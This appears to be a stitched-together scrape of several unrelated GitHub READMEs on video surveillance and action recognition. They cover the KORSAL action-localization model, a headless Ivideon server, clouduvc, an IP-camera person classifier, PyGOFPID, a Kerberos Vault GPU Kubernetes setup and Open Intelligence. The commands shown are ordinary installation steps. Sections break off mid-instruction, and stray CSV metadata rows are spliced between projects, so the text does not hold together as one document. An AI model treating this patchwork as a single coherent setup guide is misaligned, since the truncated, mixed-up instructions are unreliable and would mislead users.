Real-time and online action localization in a video is a critical yet highly challenging problem. Accurate action localization requires utilization of both temporal and spatial information. Recent attempts achieve this by using computationally intensive 3D CNN architectures or highly redundant two-stream architectures with optical flow, making them both unsuitable for real-time, online applications. To accomplish activity localization under highly challenging real-time constraints, we propose utilizing fast and efficient key-point based bounding box prediction to spatially localize actions. We then introduce a tube-linking algorithm that maintains the continuity of action tubes temporally in the presence of occlusions. Further, we eliminate the need for a two-stream architecture by combining temporal and spatial information into a cascaded input to a single network, allowing the network to learn from both types of information. Temporal information is efficiently extracted using a structural similarity index map as opposed to computationally intensive optical flow. Despite the simplicity of our approach, our lightweight end-to-end architecture achieves state-of-the-art frame-mAP on the challenging UCF101-24 dataset, demonstrating a performance gain of 6.4% over the previous best online methods. We also achieve state-of-the-art video-mAP results compared to both online and offline methods. Moreover, our model achieves a frame rate of 41.8 FPS, which is a 10.7% improvement over contemporary real-time methods.

## Highlights
- Utilize key-point-based detection architecture for the first time for the task of ST action localization, which reduces model complexity and inference time over traditional anchor-box-based approaches.
- Demonstrate that the explicit computation of OF is unnecessary and that the SSIM index map obtains sufficient inter-frame temporal information.
- A single network provided with both spatial and temporal information, and allowing it to extract necessary information through discriminative learning.
- An efficient tube-linking algorithm that extrapolates the tubes for a short period using past detections for real-time deployment.

## Installation

The code was tested on Ubuntu 18.04, with Anaconda Python 3.7 and PyTorch v1.4.0. NVIDIA GPUs are needed for both training and testing. After install Anaconda:

0. [Optional but recommended] create a new conda environment and activate the environment.
```
conda create --name CenterNet python=3.7
conda activate CenterNet
```
1. Install pytorch 1.4.0:
```
conda install pytorch=1.4.0 torchvision -c pytorch
```
Based on original [repository](https://github.com/xingyizhou/CenterNet), there can be slight reduction in performances for spatial localization with `cudann batch normalization` enabled. You can manually open `torch/nn/functional.py` and find the line with `torch.batch_norm` and replace the `torch.backends.cudnn.enabled` with `False`. 

2. Install [COCOAPI](https://github.com/cocodataset/cocoapi):
```
# COCOAPI=/path/to/clone/cocoapi
git clone https://github.com/cocodataset/cocoapi.git $COCOAPI
cd $COCOAPI/PythonAPI
make
python setup.py install --user
```

3. Install the requirements:
```
pip install -r requirements.txt
```


## Datasets
<p align='justify'>
We evaluate our framework on two datasets, <a href=https://www.crcv.ucf.edu/data/UCF101.php>UCF101-24</a> and <a href=http://jhmdb.is.tue.mpg.de/>J-HMDB21</a>. UCF101-24 is a subset of UCF101<sup>[1]</sup> dataset with ST labels, having 3207 untrimmed videos with 24 action classes, that may contain multiple instances for the same action class. J-HMDB-21 is a subset of the HMDB51<sup>[2]</sup> dataset having 928 temporally trimmed videos with 21 actions, each containing a single action instance. 

Download the datasets and extract the frames. Place the extracted frames in <emp>rgb-images</emp> in the respective dataset directory in [Datasets](https://github.com/Kalana304/KORSAL/tree/main/Datasets). The data directory should look as follows:
</p>

</p>

## Training CenterNet

### Setting up the CenterNet

When seting up CenterNet, we followed the instructions mentioned in their [official repository](https://github.com/xingyizhou/CenterNet). The modified scripts of CenterNet for Action Detection are provided in this [repository](https://github.com/Kalana304/KORSAL/tree/main/CenterNet). 

To install DCNv2, follow the below instructions:

1. **Build NMS**

```
cd CenterNet\src\lib\external
#python setup.py install
python setup.py build_ext --inplace
```

Comment out the parameter in setup.py when building `nms` extension to solve invalid numeric argument `/Wno-cpp`: `#extra_compile_args=[""-Wno-cpp"", ""-Wno-unused-function""]` (the provided script by us has made the changes already).

2. **Clone and build original DCNv2**

```
cd CenterNet\src\lib\models\networks
rm -rf DCNv2
git clone https://github.com/CharlesShang/DCNv2
```

After cloning the original DCNv2, navigate to the directory and make the following changes:

```
cd DCNv2
vim cuda/dcn_va_cuda.cu
""""""
# extern THCState *state;
THCState *state = at::globalContext().lazyInitCUDA();
""""""
```

Finally, execute the following command to build DCNv2:

```
python setup.py build develop
```

### Training from the scratch
To train from the scratch with either UCF101-24 or J-HMDB21 datasets, the following command can be run. 

```
python CUDA_VISIBLE_DEVICES=0 python main_SMDouble.py --dataset <dataset> --gpus <gpu id> --exp_id <save dir name> --task doubleSM --num_epochs <epochs (default: 60)> --variant <variation (default: 1)> 
```

### Resuming from saved checkpoint
To resume the training from the last checkpoint saved, run the following command.

```
python CUDA_VISIBLE_DEVICES=0 python main_SMDouble.py --dataset <dataset> --gpus <gpu id> --exp_id <save dir name> --task doubleSM --num_epochs <epochs (default: 60)> --variant <variation (default: 1)> --resume 
```

Further, to resume the training from a specific chekpoint saved, run the following command.

```
python CUDA_VISIBLE_DEVICES=0 python main_SMDouble.py --dataset <dataset> --gpus <gpu id> --exp_id <save dir name> --task doubleSM --num_epochs <epochs (default: 60)> --variant <variation (default: 1)> --resume --load_model <path to the saved model>
```

### Transfer Learning using the best checkpoint
To tranfer learn from a pre-trained checkpoint, run the following command.

```
python CUDA_VISIBLE_DEVICES=0 python main_SMDouble.py --dataset <dataset> --gpus <gpu id> --exp_id <save dir name> --task doubleSM --num_epochs <epochs (default: 60)> --variant <variation (default: 1)> --load_model /path/to/checkpoint
```

The pre-trained model checkpoints trained on J-HMDB21 and UCF101-24 datasets can be downloaded from [here](https://drive.google.com/drive/folders/1jb5QfujoQngP4QqyN-PGvYba1jwhb9th?usp=sharing). Place the chekpoints at `./CenterNet/exp/$DATASET_NAME/dla34/rgb/$CHKPT_NAME` to be compatible with the directory path definitions in the Centernet scripts. 

## Saving Detections
For evaluation, the spatial detections needs to be saved as <I>.mat </I> files. First, navigate to ./Save Detections/ and execute the following command:
```
python CUDA_VISIBLE_DEVICES=0 python SaveDetections.py --dataset <dataset> --ngpu <gpu id> --exp_id <save dir name> --task doubleSM --frame_gap <default:1> --variant <default:1> --load_model /path/to/checkpoint --result_root /path/to/detections
```

## Online Tube Generation

After the spatial detections are saved for each video, the action tubes and paths are generated using the proposed online tube generation algorithm and its variation that are based on the [original implementation](https://github.com/Kalana304/realtime-action-detection) which is also provided for comparison. The codes can be found in `./online-tubes/`.
 - To run the code, you will need to install MATLAB. You can install a [free trial](https://www.mathworks.com/products/matlab.html) for testing purposes. Make sure you add the MATLAB installation path to the conda environment if you are executing scripts using command line.
 - If you only have command line priviledges, you can install [Octave](https://wiki.octave.org/Octave_for_Debian_systems) and execute the tube generation.

### Executing with MATLAB

1. Navigate to the respective directory: 
```
cd ./online-tubes/EXP_without_BBOX
```
2. Change the paths based on where the data (saved detections) is located and results need saving in `I01onlineTubes.m` and `utils/initDatasetOpts.m`.
3. Execute `I01onlineTubes.m`. When executing using command line:
```
matlab -batch ""I01onlineTubes.m""
```

### Executing with Octave

1. Navigate to the respective directory: 
```
cd ./online-tubes/EXP_without_BBOX
```
2. Change the paths based on where the data (saved detections) is located and results need saving in `I01onlineTubes.m` and `utils/initDatasetOpts.m`.
3. Execute `I01onlineTubes.m`. When executing using command line:
```
octave I01onlineTubes.m
```
*There can be errors when running the current scripts in Octave. This is due to `-v7.3` argument used in `save()` function in MATLAB scripts. You can simply remove the `-v7.3` argument in `save()` functions and run without errors.* 

## Performance
<p align='justify'>
We describe our experimental results and compare them with state-of-the-art offline and online methods that use either RGB or both RGB and OF inputs. Further, for comparison
we present results on action localization using only the appearance (A) information extracted by a single frame. The results of our proposed method presented in Table demonstrate that we are able to achieve state-of-the-art performance.

We analyze the inference times for different variations of our pipeline based on the different modules in the framework and the overall inference time in the below Table.
Evidently, any preprocessing will have an impact on the inference time. Thus, the SS-map achieves a balance between the run-time and the accuracy over the other variations in the framework.

==================================


Для установки версии IvideonServer без графического интерфейса (для Linux-серверов) требуется установить отдельно пакет ivideon-server-headless или camera-server-headless:

 sudo apt-get install ivideon-server-headless

Далее необходимо провести настройку сервера с графическим интерфейсом на отдельной машине, затем скопировать файл конфигурации сервера videoserverd.config в директорию /home/<имя пользователя>/.IvideonServer/videoserverd.config

Если необходимо вести запись локального архива, то необходимо изменить путь к архиву в перенесенном файле конфигурации:

""path"" : ""/home/<имя пользователя>/.IvideonServer/archive""

Привязка сервера к аккаунту производится следующей командой:

/opt/ivideon/ivideon-server/videoserver --config-filename=/path/to/videoserverd.config --attach --email=""account@ivideon.com"" --server-name=""My First Server""

Для автоматического запуска сервера при старте системы необходимо выполнить следующее:

sudo /opt/ivideon/ivideon-server/init_ctl install <имя пользователя> <путь к файлу конфигурации>

Для удаления его из автозапуска:
sudo /opt/ivideon/ivideon-server/init_ctl uninstall

Для управления видеосервером необходимо использовать скрипт init.d:
/etc/init.d/videoserver <start|stop|restart|status>

odolgy,clouduvc,,https://github.com/odolgy/clouduvc,https://api.github.com/repos/clouduvc/odolgy,A simple video surveillance system based on cloud storage,"# Clouduvc

Clouduvc is used to create the simplest video surveillance system based on:
- Linux powered device, such as Raspberry Pi;
- webcam;
- cloud storage, e.g. Google Drive (optional).

How it works:
* Clouduvc records videos of a fixed length or takes photos and saves them to a local storage (such as an external hard drive). Recording is performed daily at a certain period of time or around the clock.
* Optionally, the latest files are uploaded to the cloud storage.
* Old files are removed from the local and the cloud storages according to the configured retention periods.

## Dependencies

* [guvcview](http://guvcview.sourceforge.net/) - video capturing software for UVC devices. Thanks to the built-in automatic camera adjustment function, this is a good solution for webcams without auto brightness and auto contrast support.
* [ffmpeg](https://ffmpeg.org/) - guvcview alternative for cameras with built-in auto brightness and auto contrast. Doesn't support camera adjustment, but allows you to control the video compression ratio, achieving better performance on low-end devices.
* [rclone](https://rclone.org/) - cloud storage synchronization software. A list of supported services can be found at [https://rclone.org/](https://rclone.org/).

## Installation

1. Install dependencies. For Debian based distributions:
``` sh
$ sudo apt install rclone ffmpeg
```
or (not preferred)
``` sh
$ sudo apt install rclone guvcview
```
2. Configure rclone (see complete guide at [https://rclone.org/docs/](https://rclone.org/docs/)):
``` sh
$ rclone config
```
Note that rclone also provides a login method for devices without a desktop environment.

3. Download clouduvc:
``` sh
$ wget https://github.com/odolgy/clouduvc/archive/master.zip
$ unzip master.zip && rm master.zip && mv clouduvc-master clouduvc
```
4. Configure the required parameters in ""clouduvc_config.sh"" file:
``` sh
$ cd clouduvc
$ cp clouduvc_config.example.sh clouduvc_config.sh
$ editor clouduvc_config.sh
```
5. Run and check that everything works:  
``` sh
$ ./clouduvc_record.sh
```
6. You can check output video resolution, fps and other parameters using [ffprobe](https://ffmpeg.org/ffprobe.html):
``` sh
$ ffprobe -hide_banner video_file.avi 
```
7. Configure autorun. Example for distributions with systemd:
``` sh
$ sudo cp clouduvc.service /etc/systemd/system/
$ sudo editor /etc/systemd/system/clouduvc.service
$ sudo systemctl enable clouduvc.service
```

8. Check that everything works:

1element,ip-camera-image-inference,,https://github.com/1element/ip-camera-image-inference,https://api.github.com/repos/ip-camera-image-inference/1element,Python script using machine learning to classify images from IP cameras.,"# IP Camera Image Inference

Python script using machine learning to classify images from IP cameras.


## Introduction

This Python script is meant to be executed as a systemd service. It will 
subscribe an MQTT broker to receive JPEG images from an IP camera.

The machine learning framework TensorFlow is used to classify images.
A deep convolutional neural network (CNN) based on the Inception v3 model 
needs to be retrained with a set of images from your IP camera to classify 
the image either as *person* or as *nothing*.

If a person is detected in the image, the Python script will publish the 
image to a specified MQTT topic. A threshold can be configured for this 
to publish even images with a lower probability score.

This script was designed to work on a Raspberry Pi 3 (ARM architecture), 
but it also runs on x86_64 and should actually run on all platforms where 
TensorFlow and Python are available.

On a Raspberry Pi 3 this is pretty slow (roughly three seconds per image). 
So make sure you have a good pre-processing of your IP camera feed and 
deliver only images where potentially movement was detected. You could 
either use the built-in motion detection of your IP camera or preferable 
a third party software detection like [Motion](https://motion-project.github.io/) for this.


## Dependencies

* TensorFlow
* Python 2.7
* Python PyYAML (pyyaml) and Eclipse Paho MQTT (paho-mqtt) packages

All dependencies can be installed automatically by executing `./install.sh`.


## Usage

### Installation

Clone this repository:

```
git clone https://github.com/1element/ip-camera-image-inference.git
```

Install dependencies:

```
./install.sh
```


### Train your model

The TensorFlow Inception v3 model is used to classify images either as
*person* or as *nothing*. For accurate scoring you need to retrain the 
final layer of the Inception model.

So before you can start `retrain.py` you need a set of images from your 
IP camera that represent the two classes *person* and *nothing*. 
Copy these images to the `retrain/person/` and `retrain/nothing/` 
directories.

After this execute:

```
python retrain.py --image_dir=/path/to/ip-camera-image-inference/retrain
```

This will take some time, especially if you run it on a Raspberry Pi. 
Consider running the training on a faster machine if you can.

Copy the output graph and labels from the temporary directory of 
your system to the model directory:

```
cp /tmp/output_graph.pb /path/to/ip-camera-image-inference/model/
cp /tmp/output_labels.txt /path/to/ip-camera-image-inference/model/
```

If you are interested in details of the retraining process refer 
to the official [TensorFlow image retraining tutorial](https://www.tensorflow.org/tutorials/image_retraining).


### Configuration

Edit the provided configuration file `config.yml`. The TensorFlow model 
directory and your MQTT broker connection as well as a few other settings 
can be configured there.


### Run as service

The Python script `image-inference.py` should be executed as a systemd 
service. There is a template file `image-inference.service` for this.
Change the paths in this file according to your environment.

Afterwards use the following commands to set up the service:

```
# copy service configuration
sudo cp image-inference.service /etc/systemd/system/

# reload systemd
sudo systemctl daemon-reload

# enable auto start
sudo systemctl enable image-inference.service

# start service now
sudo systemctl start image-inference.service

# show status
sudo systemctl status image-inference.service
```


## Previous versions

There is a previous version using a directory observer to receive images 
and FTP to distribute the classified image. If you are interested in this 
checkout the tag `v1.0.0`.


## Contributions

This script was written for my own purpose, therefore it lacks in 
features and configuration abilities. In case it might be useful for 
someone, I decided to share it. However, pull requests are welcome.

[![License](https://img.shields.io/badge/licence-BSD--3--Clause-green)](https://img.shields.io/badge/license-BSD--3--Clause-green)

PyGOFPID is a Python package implementing
[perimeter intrusion detection (PID)](https://www.mdpi.com/1424-8220/22/9/3601)
systems for video protection.

Leveraging [OpenCV](https://github.com/opencv/opencv-python), you can easily
define a pipeline using good old fashioned (GOF) computer vision methods, like
[foreground detection](https://en.wikipedia.org/wiki/Foreground_detection) and
[mathematical morphology](https://en.wikipedia.org/wiki/Mathematical_morphology).

PyGOFPID is distributed under the open source 3-clause BSD license.

## Description

Class `GOFPID` is a versatile tool allowing to build a parameterizable PID
pipeline, composed of:

1. input frame denoising by spatial blurring;
2. foreground detection by background subtraction or frame differencing;
3. foreground mask denoising by mathematical morphology;
4. foreground blob creation;
5. blob tracking (WIP);
6. post-filtering;
7. intrusion detection.

See `examples/video.py` for a simple example.

## Comparison on i-LIDS

GOFPID is useful for comparison between ancient and new generations of PID,
between good old fashioned and deep learning based PID.

[i-LIDS](https://ieeexplore.ieee.org/document/4105319) is a standard dataset
for testing video based PID.

See [pyPID](https://gitlab.liris.cnrs.fr/dlohani/pypid) for a benchmark between
PID systems on i-LIDS dataset, with results given for
[edge-level evaluation after 1s](https://www.mdpi.com/1424-8220/22/9/3601)

The following example will show you how to setup a node with one or more GPU's in a Kubernetes Cluster. Afterwards we will deploy a machine learning workload that can recognise pedestrians in one or more recordings. To handle that execution we have a couple of cameras in place (called Kerberos agents) and our open/extensible storage platform called [Kerberos Vault](https://doc.kerberos.io/vault/first-things-first/).

[Kerberos Vault](https://doc.kerberos.io/vault/first-things-first/) receives recordings from one or more (or thousands) of Kerberos agents, and will trigger events through integrations such as Kafka, SQS, etc. Everytime a recording is stored in [Kerberos Vault](https://doc.kerberos.io/vault/first-things-first/), a real-time message is generated, and a consumer (the workload we have deployed in our cluster) will download the recording and start the interference on one of you GPU based Kubernetes nodes (using the NVIDIA operator). 

# Prepare a node to run GPU based deployments

![NV-GPU-Operator-1](https://user-images.githubusercontent.com/1546779/132136901-44d90617-a80a-4933-9eca-bf965622d237.png)

To provision GPU worker nodes in a Kubernetes cluster, the following NVIDIA software components are required – the driver, container runtime, device plugin and monitoring. As shown in Figure 1, these components need to be manually provisioned before GPU resources are available to the cluster and also need to be managed during the operation of the cluster. The GPU Operator simplifies both the initial deployment and management of the components by containerizing all the components and using standard Kubernetes APIs for automating and managing these components including versioning and upgrades. The GPU operator is fully open-source and is available [at the NVIDIA GitHub repo](https://github.com/NVIDIA/gpu-operator).

![GPU-Operator-Manual-Install-Figure](https://user-images.githubusercontent.com/1546779/132136925-7f7a2c88-7d58-41ba-8b8f-8f72b0af82de.png)

## NVidia Drivers
We are assuming an Ubuntu 20.4 system with a clean installation. First things first, let's go ahead with installing the NVIDIA drivers and CUDA drivers.

    sudo -s
    apt install nvidia-driver-455
    reboot
    
    sudo -s
    nvidia-smi
    apt install nvidia-cuda-toolkit

## Setup tools

Once we have the NVIDIA drivers installed, we are ready to setup Docker and Kubernetes. Next to that we will enable NVIDIA for Docker and later on we will install the NVIDIA Kubernetes operator.

### Install Docker

Let's install Docker. We could also use `containerd` with Kubernetes.

    apt install docker.io -y    
    
Once installed modify the cgroup driver, so kubernetes will be using it correctly. By default Kubernetes cgroup driver was set to systems but docker was set to systemd.

    sudo mkdir /etc/docker
    cat <<EOF | sudo tee /etc/docker/daemon.json
    {
      ""exec-opts"": [""native.cgroupdriver=systemd""],
      ""log-driver"": ""json-file"",
      ""log-opts"": {
        ""max-size"": ""100m""
      },
      ""storage-driver"": ""overlay2""
    }
    EOF

    sudo systemctl enable docker
    sudo systemctl daemon-reload
    sudo systemctl restart docker


### Install Kubernetes
  
Install the Kubernetes toolset.

    apt update -y
    apt install apt-transport-https curl -y
    curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add
    apt-add-repository ""deb http://apt.kubernetes.io/ kubernetes-xenial main""
    apt update -y && apt install kubeadm kubelet kubectl kubernetes-cni -y

Disable swap as this is required by Kubernetes.

    swapoff -a
    sudo sed -i.bak '/ swap / s/^\(.*\)$/#\1/g' /etc/fstab

Initiate the cluster.

    kubeadm init

This might take a couple of minutes but once finished you should see following message.

    Your Kubernetes control-plane has initialized successfully!

    To start using your cluster, you need to run the following as a regular user:

      mkdir -p $HOME/.kube
      sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
      sudo chown $(id -u):$(id -g) $HOME/.kube/config

    You should now deploy a pod network to the cluster.
    Run ""kubectl apply -f [podnetwork].yaml"" with one of the options listed at:
      https://kubernetes.io/docs/concepts/cluster-administration/addons/

    Then you can join any number of worker nodes by running the following on each as root:

    kubeadm join 192.168.1.103:6443 --token ej7ckt.uof7o2iplqf0r2up \
        --discovery-token-ca-cert-hash sha256:9cbcc00d34be2dbd605174802d9e52fbcdd617324c237bf58767b369fa586209
  
      
### Install NVIDIA for Docker

To enable NVIDIA for Docker, [a couple of things will need to be installed](https://github.com/NVIDIA/k8s-device-plugin).

    distribution=$(. /etc/os-release;echo $ID$VERSION_ID) \
       && curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add - \
       && curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.list
       
       apt-get update
       apt-get install -y nvidia-docker2
       systemctl restart docker
       docker run --rm --gpus all nvidia/cuda:11.1.1-base-ubi8 nvidia-smi
   
Make an additional modification to the `daemon.json` of Docker.

        nano /etc/docker/daemon.json
        
Make sure the `.json` file is aligned with below config.

    {
        ""default-runtime"": ""nvidia"",
        ""runtimes"": {
            ""nvidia"": {
                ""path"": ""/usr/bin/nvidia-container-runtime"",
                ""runtimeArgs"": []
            }
        },
        ""exec-opts"": [""native.cgroupdriver=systemd""],
        ""log-driver"": ""json-file"",
        ""log-opts"": {
            ""max-size"": ""100m""
        },
        ""storage-driver"": ""overlay2""
    }

Restart the Docker daemon to complete the installation after setting the default runtime:

    sudo systemctl restart docker

### or Install NVIDIA for containerd

Update containerd to use nvidia as the default runtime and add nvidia runtime configuration. This can be done by adding below config to `/etc/containerd/config.toml` and restarting containerd service.

    version = 2
    [plugins]
      [plugins.""io.containerd.grpc.v1.cri""]
        [plugins.""io.containerd.grpc.v1.cri"".containerd]
          default_runtime_name = ""nvidia""
    
          [plugins.""io.containerd.grpc.v1.cri"".containerd.runtimes]
            [plugins.""io.containerd.grpc.v1.cri"".containerd.runtimes.nvidia]
              privileged_without_host_devices = false
              runtime_engine = """"
              runtime_root = """"
              runtime_type = ""io.containerd.runc.v2""
              [plugins.""io.containerd.grpc.v1.cri"".containerd.runtimes.nvidia.options]
                BinaryName = ""/usr/bin/nvidia-container-runtime""

Restart the Containerd daemon to complete the installation after setting the default runtime:

    sudo systemctl restart containerd

## Enable NVidia GPU operator

> Find the full tutorial on [the official NVIDIA docs page](https://docs.nvidia.com/datacenter/cloud-native/gpu-operator/latest/getting-started.html).

Download the NVIDIA helm chart

    helm repo add nvidia https://helm.ngc.nvidia.com/nvidia && helm repo update

Install the NVIDIA helm chart in the `gpu-operator` namespace.

    helm install --wait --generate-name \
    -n gpu-operator --create-namespace \
    nvidia/gpu-operator

## Create a GPU workload and scale with Kerberos Vault

When creating a new pod or deployment, you assign a number of GPUs to the workload, this will make sure the workload is scheduled on a node which has one or more GPUs available. Magic, all done by the NVIDIA Kubernetes operator. So the conclusion is that you can add as much nodes and GPUs you want, and you can simply increase the `replicas: 1` parameter to the number of GPUs you have available.

![Integration in practice (Yolov3)](https://user-images.githubusercontent.com/1546779/133740877-a0bc2261-57ad-47b7-ab01-a929329b729a.png)

Once you have created below deployment in your Kubernetes cluster, you will have one or more machine learning workloads integrated with your Kerberos Vault and Kafka broker. Due to the nature of Kafka, and how we designed the Kerberos Enterprise suite, it will also loadbalance or divide and concur the request over your different GPU's. Have some fun ;)

## Introduction


<div align=center><img src=""https://github.com/RuizeHan/CIP/blob/master/figs/example.png"" width=""450"" height=""360"" alt=""example""/><br/>
<div align= justify>
Fast and accurate identification of the co-interest persons, who draw joint interest of the surrounding people, plays an important role in social scene understanding and surveillance. Previous study mainly focuses on detecting co-interest persons from a single-view video. In this paper, we study a much more realistic and challeng-
ing problem, namely co-interest person (CIP) detection from multiple temporally-synchronized videos taken by the complementary and time-varying views. Specifically, we use a top-view camera, mounted on a flying drone at a high altitude to obtain a global view of the whole scene and all subjects on the ground, and multiple
horizontal-view cameras, worn by selected subjects, to obtain a local view of their nearby persons and environment details. We present an efficient top- and horizontal-view data fusion strategy to mapmultiplehorizontalviewsintotheglobaltopview.We then propose a spatial-temporal CIP potential energy function that jointly considers both intra-frame confidence and inter-frame consistency, thus leading to an effective Conditional Random Field (CRF) formulation. We also construct a complementary-view video dataset, which provides a benchmark for the study of multi-view co-interest person detection. Extensive experiments validate the effectiveness and superiority of the proposed method.

We show the CIP detection results on sample frames from the top-view and three horizontal-view videos in the following figure. Red and green boxes indicate the detected CIP and the ground truth, respectively. Frames with a solid blue star on the top-left corner indicate that no CIP is detected by our algorithm, e.g., they are drawn from the CIP’s egocentric video or the CIP is occluded in these frames. As shown in the figure, the proposed algorithm can detect CIP even if the CIP shows similar appearance and motion characteristics with other people. We can see that the proposed method can combine multiple horizontal views and a complementary top view for more comprehensive and accurate CIP detection.

## Installation

To run this project, you need to have the following libraries installed:

- OpenCV (cv2)
- NumPy
- Keras
- Imutils

You can install the required libraries using pip:

```bash
pip install opencv-python
pip install numpy
pip install keras
pip install imutils
```

## Usage

The code uses a pre-trained neural network model (`saved_model.h5`) to detect abnormal events in video streams. The main logic of the code is as follows:

1. Load the pre-trained neural network model using Keras.
2. Read video frames from the specified video file.
3. Process each frame to extract features for anomaly detection.
4. Calculate the mean squared loss (MSE) between the original frame and the reconstructed frame obtained from the model.
5. Temporal smoothing: Apply a smoothing factor to the loss values to reduce noise.
6. Dynamically adjust the threshold for anomaly detection based on past scores.
7. If the smoothed loss exceeds the threshold, an abnormal event is detected.

The code continuously processes video frames and displays the video with detected abnormal events marked.

Has PWA ready web front end. Meant to make property monitoring faster without need to watch video recordings.","![Open-Intelligence-title-logo](docs/img/oi_title_logo.png)


⚠️ <b>Notice:</b> due to lack of my own interest towards this project, I have decided to archive this project  ⚠️
<br>
<br>

Open Intelligence processes <b>any camera</b> motion triggered images and sorts seen objects using Yolo, it provides
easy to use front end web interface with rich features so that you can have up to date intel what is the current status
on your property. Open Intelligence uses license plate detection (ALPR)
to detect vehicle plates and face detection to detect people faces which then can be sorted into person folders and then
can be trained so that Open Intelligence can try to identify seen people. All this can be done from front end interface.

Open Intelligence uses super resolution neural network to process super resolution images for improved license plate
detection.

Project goal is to be useful information gathering tool to provide data for easy property monitoring without need for
expensive camera systems because any existing cameras are suitable.

I developed this to my own use because were tired to use existing monitoring tools to go through recorded video. I
wanted to know what has been happening quickly.

Open Intelligence is meant to be run with Docker.

Environment
============

Everything can be installed on one server or to separate servers meaning that database is at server one, python
application at server two and api hosting at server three. Processes must have access to output storage containing 
processed image result files.

![Environment](docs/environment.png)


Installing with Docker
============
This section has step-by-step installation tutorial to get started with Docker based installation. Docker way of running
Open-Intelligence is not going to limit you for only Docker, you can still run for example api, front-end, app.py,
similarity processes with Docker and have separate GPU enabled machine for super resolution and insightface processes.

### 1. Install database

Download [PostgreSQL](https://www.postgresql.org/) and install it on any machine you want on your network. Look over
with search engine how to make it available on local network devices if you are installing it on a different machine
than what is running Docker images.

### 2. Install Docker

If you don't already have, go to [https://docs.docker.com/get-docker/](https://docs.docker.com/get-docker/) and follow
their instructions.

### 3. Install Docker Compose

If you don't already have, go to [https://docs.docker.com/compose/install//](https://docs.docker.com/compose/install//) and follow
their instructions.

### 4. Clone this repository code

Use any version control tool to clone this repository code. I recommend using any git based tool so that you can
checkout latest code and by recommend, I mean don't download it as ""offline"" zip file.

Using git from shell:

```shell script
git clone https://github.com/norkator/open-intelligence.git
```

### 5. Get models

Get models here https://drive.google.com/file/d/1dSJuxpwSFfF7SIJg8NMKG5yCIG9CHQKw/view?usp=sharing
unzip models into open intelligence `/python/models` folder.

### 6. Configure

1. Rename `docker-compose.yml_tpl` into `docker-compose.yml` and fill in your environment variables which pretty much
   are database configuration.

### 7. Verify your timezone (linux server distro case)

https://github.com/norkator/open-intelligence/wiki/Linux-notes#ensure-your-timezone-is-right

### 8. Configure storage
On linux machine configuring storage steps are:

Open docker-compose.yml and tweak all volume configs
```yaml
    volumes:
      - ./python/:/app
      - /Users/<user-name>/Desktop/camera_root:/input
      - /Users/<user-name>/Desktop/output:/output_test
```
where first part `/Users/<user-name>/Desktop/camera_root` is your path to your host machine folder. 
Same with another output folder path. Its just some folder in your machine where you want all open intelligence
output files to be stored.

That latter part like `:/input` and `:/output_test` is how python process sees paths in container side. 
It does not affect any way to your actual mounted folders so better not change these. 

More on this article: https://github.com/norkator/open-intelligence/wiki/Configuring-storage

### 9. Run

1. Run `docker-compose up` in root of this project and let magic happen.
2. Open `http://localhost:3000/` and you should see Open Intelligence front page. Hopefully.


### 10. Configuration from UI

1. Go to Configuration page and fill in your details. Content settings are explained at
   configuration page.
2. Run `docker-compose up` again so that changes takes effect in python side.


Updating to the latest version
============

Run at root of this project:

```shell
git fetch
git pull
docker-compose build
docker-compose up
```



Process drawing

Python Apps
============
This part is explaining in better detail what each of base python app scripts is meant for. Many tasks are separated for
each part. App.py is always main process, the first thing that sees images.

App
-----

* File: `App.py`
* Status: *Mandatory*
* This is main app which is responsible for processing input images from configured sources.
* Cluster support: Yes.

StreamGrab
-----

* File: `StreamGrab.py`
* Status: *Optional*
* If you don't have cameras which are outputting images, you can configure multiple camera streams using this stream
  grabber tool to create constant input images.
* Cluster support: No.

SuperResolution
-----

* File: `SuperResolution.py`
* Status: *Optional*
* This tool processes super resolution images and run's new detections for these processed sr images. This is no way
  mandatory for process.
* Cluster support: No.
* Mainly meant for improved license plate detection.
* Testing: use command `python SuperResolutionTest.py --testfile=""some_file.jpg""` which will load image by given name
  from `/images` folder.

InsightFace
-----

* File: `InsightFace.py`
* Status: *Optional*
* Process faces page 'face wall' images using InsightFace retina model.
* Cluster support: No.

SimilarityProcess
-----

* File: `SimilarityProcess.py`
* Status: *Optional*
* Compares current running day images for close duplicates and deletes images determined as duplicate having no higher
  value (no detection result). Processes images in one hour chunks.
* Cluster support: No.
* Process is trying to save some space.



Installing manually
============
This is no longer recommended. Using docker method is much better.

Terminology for words like API side and Python side:

* ""API Side"" is `/api` folder containing node api process `intelligence.js`.
* ""Python side"" is `/python` folder containing different python processes.

See [Project folder structure](#project-folder-structure)  for more details about folders.

API side
-----

1. Go to `/api` folder and run `npm install`
2. Install PostgreSQL server: https://www.postgresql.org/
    * Accessing postgres you need to find tool like pgAdmin which comes with postgres, command line or some IDE having
      db tools.
3. Rename `.env_tpl` to `.env` and fill details.
4. Run `intelligence-tasks.js` or with PM2 process manager `pm2 start intelligence-tasks.js`.
5. Run `node intelligence.js` or with PM2 process manager `pm2 start intelligence.js -i 2`.
6. Running these NodeJS scripts will create database and table structures, if you see error run it again.
7. Go to `/front-end` folder and rename `.env_tpl` to `.env`.
8. At `/front-end` run `npm start` so you have both api and front end running.
9. Access `localhost:3000` if react app doesn't open browser window automatically.
10. Outdated frontend user manual for old ui
    version https://docs.google.com/document/d/1BwjXO0tUM9aemt1zNzofSY-DKeno321zeqpcmPI-wEw/edit?usp=sharing

Build react front end
-----

1. Go to `/front-end`
2. Check your `.env` REACT_APP_API_BASE_URL that it corresponds your machine ip address where node js api is running.
3. Build react front end via running `npm run build`
4. Copy/replace `/build` folder contents somewhere to serve build webpage if you want.

Python side
-----
(Windows)

1. Download Python 3.6 ( https://www.python.org/ftp/python/3.6.0/python-3.6.0-amd64.exe )
    * Only tested to work with Python 3.6. Newer ones caused problems with packages when tested.
2. Jump to `/python` folder
3. Activate python virtual env.
   ```shell script
   .\venv\Scripts\activate.bat
   ```
4. Install dependencies `pip install -r requirements_windows.txt`
5. Get models using these instruction https://github.com/norkator/open-intelligence/wiki/Models
6. Download PostgreSQL server ( https://www.postgresql.org/ ) I am using version <b>11.6</b> but its also tested with
   version 12. (if you didn't install at upper api section)
7. Ensure you have `Microsoft Visual C++ 2015 Redistributable (x64)` installed.
    * This is needed by openALPR
8. Separate camera and folder names with comma just like at base config template
9. Run wanted python apps, see `Python Apps` section.



Python side
-----
(Linux)

1. Install required Python version.
